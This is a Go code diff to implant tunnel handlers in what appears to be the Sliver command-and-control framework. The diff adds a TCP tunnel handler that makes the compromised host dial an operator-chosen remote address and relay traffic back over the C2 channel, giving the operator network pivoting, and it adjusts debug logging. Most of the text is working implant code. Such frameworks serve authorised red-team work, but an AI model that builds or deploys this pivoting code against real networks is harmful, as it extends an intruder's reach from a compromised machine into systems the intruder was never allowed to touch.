@@ -19,7 +19,13 @@ package handlers
 */
 
 import (
+	"fmt"
 	"io"
+	"net"
+	"os"
+	"reflect"
+	"runtime"
+	"strings"
 	"time"
 
 	// {{if .Config.Debug}}
@@ -35,11 +41,17 @@ import (
 
 const (
 	readBufSize = 1024
+
+	successfulTCPTunnelReq          = 0x00
+	failedMessageUnmarshalErrorCode = 0xF0
+	failedTCPRemoteHostResolve      = 0xF1
+	failedTCPRemoteHostConnect      = 0xF2
 )
 
 var (
 	tunnelHandlers = map[uint32]TunnelHandler{
-		sliverpb.MsgShellReq: shellReqHandler,
+		sliverpb.MsgShellReq:     shellReqHandler,
+		sliverpb.MsgTCPTunnelReq: tcpTunnelReqHandler,
 
 		sliverpb.MsgTunnelData:  tunnelDataHandler,
 		sliverpb.MsgTunnelClose: tunnelCloseHandler,
@@ -78,21 +90,12 @@ func tunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 	proto.Unmarshal(envelope.Data, tunnelData)
 	tunnel := connection.Tunnel(tunnelData.TunnelID)
 	if tunnel != nil {
-
 		if _, ok := tunnelDataCache[tunnelData.TunnelID]; !ok {
 			tunnelDataCache[tunnelData.TunnelID] = map[uint64]*sliverpb.TunnelData{}
 		}
 
-		// Since we have no guarantees that we will receive tunnel data in the correct order, we need
-		// to ensure we write the data back to the reader in the correct order. The server will ensure
-		// that TunnelData protobuf objects are numbered in the correct order using the Sequence property.
-		// Similarly we ensure that any data we write-back to the server is also numbered correctly. To
-		// reassemble the data, we just dump it into the cache and then advance the writer until we no longer
-		// have sequential data. So we can receive `n` number of incorrectly ordered Protobuf objects and
-		// correctly write them back to the reader.
-
 		// {{if .Config.Debug}}
-		log.Printf("[tunnel] Cache tunnel %d (seq: %d)", tunnel.ID, tunnelData.Sequence)
+		fmt.Printf("[tunnel] Read %d bytes from tunnel %d\n", len(tunnelData.Data), tunnel.ID)
 		// {{end}}
 		tunnelDataCache[tunnel.ID][tunnelData.Sequence] = tunnelData
 
@@ -128,6 +131,9 @@ type tunnelWriter struct {
 }
 
 func (tw tunnelWriter) Write(data []byte) (n int, err error) {
+	// {{if .Config.Debug}}
+	fmt.Printf("[tunnel] Write %d bytes to tunnel %d\n", len(data), tw.tun.ID)
+	// {{end}}
 	data, err = proto.Marshal(&sliverpb.TunnelData{
 		Sequence: tw.tun.WriteSequence, // The tunnel write sequence
 		TunnelID: tw.tun.ID,
@@ -220,4 +226,125 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	log.Printf("Started shell with tunnel ID %d", tunnel.ID)
 	// {{end}}
 
+}
+
+func tcpTunnelReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+	isClosedConnError := func(err error) bool {
+		errno := func(v error) uintptr {
+			if rv := reflect.ValueOf(v); rv.Kind() == reflect.Uintptr {
+				return uintptr(rv.Uint())
+			}
+			return 0
+		}
+
+		if err == nil {
+			return false
+		}
+
+		// TODO: remove this string search and be more like the Windows
+		// case below. That might involve modifying the standard library
+		// to return better error types.
+		str := err.Error()
+		if strings.Contains(str, "use of closed network connection") {
+			return true
+		}
+
+		// TODO(bradfitz): x/tools/cmd/bundle doesn't really support
+		// build tags, so I can't make an http2_windows.go file with
+		// Windows-specific stuff. Fix that and move this, once we
+		// have a way to bundle this into std's net/http somehow.
+		if runtime.GOOS == "windows" {
+			if oe, ok := err.(*net.OpError); ok && oe.Op == "read" {
+				if se, ok := oe.Err.(*os.SyscallError); ok && se.Syscall == "wsarecv" {
+					const WSAECONNABORTED = 10053
+					const WSAECONNRESET = 10054
+					if n := errno(se.Err); n == WSAECONNRESET || n == WSAECONNABORTED {
+						return true
+					}
+				}
+			}
+		}
+		return false
+	}
+
+	returnStatusCode := func(statusCode byte, connection *transports.Connection) {
+		// {{if .Config.Debug}}
+		log.Printf("Returning status code for tcptunnel %d\n", statusCode)
+		// {{end}}
+		tcpTunnelResp, _ := proto.Marshal(&sliverpb.TCPTunnel{
+			StatusCode: uint32(statusCode),
+		})
+		connection.Send <- &sliverpb.Envelope{
+			ID:   envelope.ID,
+			Data: tcpTunnelResp,
+		}
+	}
+
+	tcpTunnelReq := &sliverpb.TCPTunnelReq{}
+	err := proto.Unmarshal(envelope.Data, tcpTunnelReq)
+	if err != nil {
+		returnStatusCode(failedMessageUnmarshalErrorCode, connection)
+		return
+	}
+
+	remoteHost := tcpTunnelReq.RemoteHost
+	remotePort := tcpTunnelReq.RemotePort
+
+	remoteAddressString := fmt.Sprintf("%s:%d", remoteHost, remotePort)
+
+	remoteAddress, err := net.ResolveTCPAddr("tcp4", remoteAddressString)
+	if err != nil {
+		returnStatusCode(failedTCPRemoteHostResolve, connection)
+		return
+	}
+
+	remoteConn, err := net.DialTCP("tcp4", nil, remoteAddress)
+	if err != nil {
+		returnStatusCode(failedTCPRemoteHostConnect, connection)
+		return
+	}
+	returnStatusCode(successfulTCPTunnelReq, connection)
+
+	tunnel := &transports.Tunnel{
+		ID:     tcpTunnelReq.TunnelID,
+		Reader: remoteConn,
+		Writer: remoteConn,
+	}
+	connection.AddTunnel(tunnel)
+
+	go func() {
+		for connection.Tunnel(tunnel.ID) != nil {
+			tWriter := tunnelWriter{
+				tun:  tunnel,
+				conn: connection,
+			}
+			byteArrayRead := make([]byte, 1024)
+			bytesRead, err := tunnel.Reader.Read(byteArrayRead)
+			if bytesRead != 0 {
+				tWriter.Write(byteArrayRead[:bytesRead])
+			} else if isClosedConnError(err) {
+				// Socket has been closed
+				break
+			}
+
+			if err != nil && err != io.ErrShortWrite {
+				// {{if .Config.Debug}}
+				log.Printf("Closing tunnel because of error %s\n", err.Error())
+				// {{end}}
+				break
+			}
+		}
+
+		// Cleanup
+		connection.RemoveTunnel(tunnel.ID)
+		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
+			Closed:   true,
+			TunnelID: tunnel.ID,
+		})
+		connection.Send <- &sliverpb.Envelope{
+			Type: sliverpb.MsgTunnelClose,
+			Data: tunnelClose,
+		}
+		remoteConn.Close()
+	}()
 }
